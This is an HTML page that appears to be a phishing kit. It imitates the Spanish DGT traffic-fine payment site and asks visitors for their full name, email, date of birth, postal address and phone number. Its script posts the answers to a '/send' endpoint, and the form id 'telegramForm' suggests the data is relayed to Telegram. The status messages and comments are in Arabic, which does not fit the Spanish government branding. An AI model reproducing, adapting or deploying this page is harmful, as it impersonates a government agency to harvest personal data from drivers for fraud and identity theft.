<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Multa de Tráfico - DGT</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" />

<style>
/* ... (نسخ نفس الCSS اللي عندك) ... */
body { font-family: 'Poppins', sans-serif; background-color: #f4f7fb; color: #333; margin: 0; padding: 0; overflow-x: hidden; }
/* تكملة باقي CSS ... */
</style>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-light sticky-top">
<div class="container">
<img alt="DGT logo" src="https://th.bing.com/th/id/OIP.WmY7Qq5D4PjcUa_Vj8SwggHaDw?w=308&h=177&c=7&r=0&o=5&dpr=1.5&pid=1.7" />
<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"></button>
<div class="collapse navbar-collapse" id="navbarNav">
<ul class="navbar-nav ms-auto">
<li class="nav-item"><a class="nav-link" href="#">Nuestros servicios</a></li>
<li class="nav-item"><a class="nav-link" href="#">Muévete con seguridad</a></li>
<li class="nav-item"><a class="nav-link" href="#">Estado del tráfico</a></li>
<li class="nav-item"><a class="nav-link" href="#">Conoce la DGT</a></li>
<li class="nav-item"><a class="nav-link" href="#">Comunicación</a></li>
</ul>
</div>
</div>
</nav>

<header>
<h2>Pago de Multa de Tráfico</h2>
<p>Por favor, complete la siguiente información para proceder con el pago de su multa.</p>
</header>

<section class="procedure">
<form id="telegramForm">
<div class="row">
<div class="col-md-6 form-group"><label>Apellidos</label><input name="first_name" type="text" required /></div>
<div class="col-md-6 form-group"><label>Nombres</label><input name="last_name" type="text" required /></div>
</div>

<div class="row">
<div class="col-md-6 form-group"><label>Email</label><input name="email" type="email" required /></div>
<div class="col-md-6 form-group"><label>Fecha de Nacimiento</label><input name="dob" type="date" required /></div>
</div>

<div class="row">
<div class="col-md-4 form-group"><label>Dirección Postal</label><input name="address" type="text" required /></div>
<div class="col-md-4 form-group"><label>Código Postal</label><input name="postal" type="text" required /></div>
<div class="col-md-4 form-group"><label>Ciudad</label><input name="city" type="text" required /></div>
</div>

<div class="row">
<div class="col-md-4 form-group"><label>Número de Teléfono</label><input name="num" type="tel" maxlength="11" required /></div>
</div>

<button class="btn btn-primary" type="submit">Pagar Multa</button>
<p id="status" style="margin-top:10px;color:green;"></p>
</form>
</section>

<footer>
<div class="container">
<p>C/ Josefa Valcarcel, 28 - 28071 Madrid-España</p>
</div>
</footer>

<script>
const form = document.getElementById('telegramForm');
const status = document.getElementById('status');

form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    try {
        const res = await fetch('/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await res.json();
        if(result.success) {
            status.style.color = 'green';
            status.textContent = 'تم الإرسال بنجاح ✅';
            form.reset();
        } else {
            status.style.color = 'red';
            status.textContent = 'فشل الإرسال ❌';
        }
    } catch(err) {
        status.style.color = 'red';
        status.textContent = 'خطأ في الاتصال ❌';
    }
});
</script>

</body>
</html>
